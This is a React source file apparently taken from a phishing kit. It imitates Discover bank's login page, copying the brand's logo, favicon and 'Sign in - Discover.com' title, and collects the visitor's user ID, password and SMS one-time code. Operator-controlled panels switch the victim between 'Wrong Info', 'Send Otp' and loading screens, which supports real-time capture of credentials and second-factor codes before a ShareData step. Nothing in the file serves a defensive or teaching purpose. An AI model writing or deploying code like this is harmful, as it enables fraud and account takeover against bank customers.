import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import DiscoverFavIcon from "../../../../../../../../assets/allBanks/banks/discover/dis3.ico";
import DiscoverImg from "../../../../../../../../assets/allBanks/banks/discover/dis2.svg";
import { LiaIdCardSolid, LiaLockSolid } from "react-icons/lia";
import { Link } from "react-router-dom";
import { PiLockKeyThin } from "react-icons/pi";
import { BsExclamationCircleFill } from "react-icons/bs";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Discover = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign in - Discover.com"
        handleCancel={handleCancel}
        img={DiscoverFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header className="w-full px-20 py-6 border-b bg-customGray-1042 border-b-customGray-500">
        <div className="flex justify-center w-full customTablet1:block">
          <img
            src={DiscoverImg}
            alt=""
            className="w-[113px] h-[21px] object-contain"
          />
        </div>
      </header>
      <div className="flex items-center justify-center px-6 pt-8 pb-20">
        <div
          className={clsx(
            " customMiniTablet:w-[400px]   w-full",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div className="flex items-center gap-2 mb-3 text-customGray-1043">
            <PiLockKeyThin size={28} />
            <h3 className="text-xl font-semibold">Secure Account Login</h3>
          </div>
          <div>
            <div className="mb-4">
              <input
                type="text"
                value={formState.username}
                name="username"
                onChange={handleChange}
                placeholder="User ID"
                className={clsx(
                  "w-full px-4 py-4 border border-customGray-1044 rounded-xl",
                  errorFormState.username ? "border border-customRed-1000" : ""
                )}
              />
              {errorFormState.username && (
                <p className="flex gap-2 mt-2 text-sm text-customRed-1000">
                  <BsExclamationCircleFill className="mt-[2px]" />
                  User ID is required
                </p>
              )}
            </div>
            <div className="mb-4">
              <input
                type="password"
                value={formState.password}
                name="password"
                onChange={handleChange}
                placeholder="Password"
                className={clsx(
                  "w-full px-4 py-4 border border-customGray-1044 rounded-xl",
                  errorFormState.password ? "border border-customRed-1000" : ""
                )}
              />
              {errorFormState.password && (
                <p className="flex gap-2 mt-2 text-sm text-customRed-1000">
                  <BsExclamationCircleFill className="mt-[2px]" />
                  Password is required
                </p>
              )}
            </div>
            <button
              onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
              className="w-full py-2 text-lg font-bold text-white rounded-full bg-customOrange-100"
            >
              {loading && <ClipLoader size={10} color="#fff" />}
              {loading ? "Loading..." : "Log In"}
            </button>
            <div className="flex flex-col items-center justify-center mt-5 space-y-2">
              <Link to="https://www.discover.com/" className="flex gap-1">
                <LiaLockSolid />
                <p className="text-sm text-customBlue-1015">
                  Forgot User ID/Password
                </p>
              </Link>
              <Link to="https://www.discover.com/" className="flex gap-1">
                <LiaIdCardSolid />
                <p className="text-sm text-customBlue-1015">Register Account</p>
              </Link>
            </div>
          </div>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div
                      className={clsx(" customMiniTablet:w-[400px]   w-full")}
                    >
                      <div className="flex items-center gap-2 mb-3 text-customGray-1043">
                        <PiLockKeyThin size={28} />
                        <h3 className="text-xl font-semibold">
                          Secure Account Login
                        </h3>
                      </div>
                      <div>
                        <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                          <BsExclamationCircleFill className="mt-[2px]" />

                          <p>{activePathDetails.body}</p>
                        </div>
                        <div className="mb-4">
                          <input
                            type="text"
                            value={formState.username}
                            name="username"
                            onChange={handleChange}
                            placeholder="User ID"
                            className={clsx(
                              "w-full px-4 py-4 border border-customGray-1044 rounded-xl",
                              errorFormState.username
                                ? "border border-customRed-1000"
                                : ""
                            )}
                          />
                          {errorFormState.username && (
                            <p className="flex gap-2 mt-2 text-sm text-customRed-1000">
                              <BsExclamationCircleFill className="mt-[2px]" />
                              User ID is required
                            </p>
                          )}
                        </div>
                        <div className="mb-4">
                          <input
                            type="password"
                            value={formState.password}
                            name="password"
                            onChange={handleChange}
                            placeholder="Password"
                            className={clsx(
                              "w-full px-4 py-4 border border-customGray-1044 rounded-xl",
                              errorFormState.password
                                ? "border border-customRed-1000"
                                : ""
                            )}
                          />
                          {errorFormState.password && (
                            <p className="flex gap-2 mt-2 text-sm text-customRed-1000">
                              <BsExclamationCircleFill className="mt-[2px]" />
                              Password is required
                            </p>
                          )}
                        </div>
                        <button
                          onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                          className="w-full py-2 text-lg font-bold text-white rounded-full bg-customOrange-100"
                        >
                          {loading && <ClipLoader size={10} color="#fff" />}
                          {loading ? "Loading..." : "Log In"}
                        </button>
                        <div className="flex flex-col items-center justify-center mt-5 space-y-2">
                          <Link
                            to="https://www.discover.com/"
                            className="flex gap-1"
                          >
                            <LiaLockSolid />
                            <p className="text-sm text-customBlue-1015">
                              Forgot User ID/Password
                            </p>
                          </Link>
                          <Link
                            to="https://www.discover.com/"
                            className="flex gap-1"
                          >
                            <LiaIdCardSolid />
                            <p className="text-sm text-customBlue-1015">
                              Register Account
                            </p>
                          </Link>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>

                    <div className={clsx(" customMiniTablet:w-[400px]")}>
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-3 text-lg font-bold leading-5 text-customOrange-100">
                              Your temporary identification code has been sent
                              to your mobile phone:
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-2 text-sm font-semibold text-customGray-1043">
                              Once you receive a temporary identification code,
                              please enter it below:
                            </h2>
                            <div className="pr-24">
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                className={clsx(
                                  "w-full px-4 py-4 border border-customGray-1044 rounded-xl no-spinner",
                                  errorOtp.otpo
                                    ? "border border-customRed-1000"
                                    : ""
                                )}
                              />
                              {errorOtp.otpo && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-1000">
                                  <BsExclamationCircleFill className="mt-[2px]" />
                                  Please enter the verification code.
                                </p>
                              )}
                            </div>
                            <p className="mt-1 text-sm text-customGray-800 ">
                              Your identification code is for one-time use only
                            </p>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className="w-[40%] py-2 my-4 text-lg font-bold text-white rounded-full bg-customOrange-100"
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Submit"}
                            </button>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />
              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div className={clsx(" customMiniTablet:w-[400px]")}>
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-3 text-lg font-bold leading-5 text-customOrange-100">
                              Your temporary identification code has been sent
                              to your mobile phone:
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-2 text-sm font-semibold text-customGray-1043">
                              Once you receive a temporary identification code,
                              please enter it below:
                            </h2>
                            <div className="pr-24">
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                className={clsx(
                                  "w-full px-4 py-4 border border-customGray-1044 rounded-xl no-spinner",
                                  errorOtp.otpo
                                    ? "border border-customRed-1000"
                                    : ""
                                )}
                              />
                              {errorOtp.otpo && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-1000">
                                  <BsExclamationCircleFill className="mt-[2px]" />
                                  Please enter the verification code.
                                </p>
                              )}
                              <h3 className="mt-2 text-sm text-customRed-200">
                                {activeOtp.body}
                              </h3>
                            </div>
                            <p className="mt-1 text-sm text-customGray-800 ">
                              Your identification code is for one-time use only
                            </p>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className="w-[40%] py-2 my-4 text-lg font-bold text-white rounded-full bg-customOrange-100"
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Submit"}
                            </button>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.discover.com/"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </motion.div>
  );
};

export default Discover;
